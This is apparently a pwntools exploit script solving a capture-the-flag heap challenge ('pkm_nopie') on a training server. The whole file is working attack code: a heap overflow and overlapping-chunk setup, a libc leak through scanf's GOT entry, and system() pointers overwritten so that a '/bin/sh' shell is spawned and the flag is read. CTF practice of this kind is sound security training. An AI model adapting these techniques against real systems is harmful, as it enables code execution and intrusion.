from pwn import *
import time

#context.terminal = ("tmux", "splitw", "-h")

libc = ELF("./libc-2.27_notcache.so")
binary = ELF("./pkm_nopie")

r = remote("bin.training.jinblack.it", 2025)
# r = process("./pkm_nopie")

commands = """
# brva 0x1290 pkm_nopie
# br *0x401a4f
"""

# gdb.attach(r, commands)

def add_pkm():
    r.recvuntil("> ")
    r.sendline(b"0")
    r.recvuntil("[*] New PKM!\n")
    alloc_result = r.recvline()
    if(alloc_result == "[!] No more free slots for pkms"):
        print("[!] No more free slots for pkms")

def rename_pkm(index, length, name):
    r.recvuntil("> ")
    r.sendline(b"1")
    r.recvuntil("[*] Choice a PKM")
    r.recvuntil("> ")
    r.sendline(b"%d" % index)
    r.recvuntil("[.] insert length: ")
    r.sendline(b"%d" % length)
    time.sleep(0.1)
    r.send(name)

def delete_pkm(index):
    r.recvuntil("> ")
    r.sendline(b"2")
    r.recvuntil("[*] Delete PKM!")
    r.recvuntil("> ")
    r.sendline(b"%d" % index)
    time.sleep(0.1)

def fight_pkm(index, move, index2):
    r.recvuntil("> ")
    r.sendline(b"3")
    r.recvuntil("[*] Fight PKMs!")
    r.recvuntil("> ")
    r.sendline(b"%d" %index)
    r.recvuntil("[*] Choice a Move!")
    r.recvuntil("> ")
    r.sendline(b"%d" %move)
    r.recvuntil("> ")
    r.sendline(b"%d" %index2)


def info_pkm(index):
    r.recvuntil("> ")
    r.sendline(b"4")
    r.recvuntil("[%d] " % index)
    value = u64(r.recv(6) + b"\x00\x00")
    print(p64(value))
    r.recvuntil("> ")
    r.sendline(b"%d" % index)
    return value


SIZE = 0xd0
scanf_plt = 0x0404058
pkms_address = 0x4040c0
scanf_offset = libc.symbols["__isoc99_scanf"]
bin_sh_offset = next(libc.search(b"/bin/sh"))
system_offset = libc.symbols["system"]

add_pkm() #0  -> A
add_pkm() #1  -> B

payload = 0x400
rename_pkm(0, 0x60, b"\n")
rename_pkm(1, 0x408, b"\x00" * 0x3f0 + p64(payload)[:-1] + b"\n")
add_pkm() #2  -> C


delete_pkm(1)  # B
add_pkm() #1

rename_pkm(0, 0x68, b"\x00" * 0x68)

add_pkm()  # 3
add_pkm()  # 4
add_pkm()  # 5

delete_pkm(3)
delete_pkm(2)

payload = b"A" * 0xf0
payload += p64(0x80)
payload += p64(0x100)
payload += p64(0x28)
payload += p64(0x0)
payload += p64(0x64)
payload += p64(0x64)
payload += p64(0x0)
payload += p64(scanf_plt)
payload += p64(0x4)

rename_pkm(1, 0x560, payload + b"\n")

libc_leak = info_pkm(4)
libc_base = libc_leak - scanf_offset
print("[!] libc_leak: " + hex(libc_leak))
print("[!] libc_base: " + hex(libc_base))

payload = b"A" * 0xf0
# payload += b"/bin/sh\x00"
payload += p64(0x0)
payload += p64(0x100)
payload += b"/bin/sh\x00"
payload += p64(0x0)
payload += p64(0x64)
payload += p64(0x64)
payload += p64(0x0)
payload += p64(0x0)
payload += p64(0x4)
payload += p64(0x0)
payload += p64(0x0)
payload += p64(0x0)
payload += p64(0x0)
payload += p64(0x0)
payload += p64(libc_base + system_offset)
payload += p64(libc_base + system_offset)
payload += p64(libc_base + system_offset)
payload += p64(libc_base + system_offset)
payload += b"\x00" * 0x70

rename_pkm(1, 0x560, payload + b"\n")

fight_pkm(4, 0, 5)

time.sleep(0.2)

print(r.recvline())

r.sendline("cat flag")

# r.interactive()

print(r.recvline())
